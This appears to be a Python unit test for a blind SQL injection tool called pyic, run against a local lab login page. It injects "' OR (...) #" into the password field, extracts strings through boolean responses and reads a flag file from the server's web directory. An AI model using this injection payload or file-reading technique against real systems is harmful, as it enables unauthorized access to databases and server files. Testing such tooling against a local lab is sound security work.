from unittest import TestCase

import requests

from pyic import BlindTester, BlindStringFinder, SqliEncoder, MysqlPayloads


class TestBlindStringFinder(TestCase):

    def setUp(self):
        self.tester = BlindTester(
            lambda payload: requests.post('http://127.0.0.1:8181/login.php',
                                          data={'login': 'admin', 'pass': "' OR ({}) #".format(payload)}),
            lambda r: 'Logged' in r.text)

        self.string_finder = BlindStringFinder(self.tester, MysqlPayloads())

    def test_all(self):
        for i in range(0, 10):
            self.assertFalse(self.tester.test('1=0'))

        for i in range(0, 10):
            self.assertTrue(self.tester.test('1=1'))

        self.assertEqual(self.string_finder.str_length("(SELECT {})".format(SqliEncoder.str_to_hexa('coucou'))),
                         6)

        self.assertEqual(self.string_finder.read_string("(SELECT {})".format(SqliEncoder.str_to_hexa('coucou'))),
                         'coucou')

        self.assertEqual(self.string_finder.read_file('/var/www/html/flag.txt'), 'dee8cha8moh9ahyeM4atheemi\n')
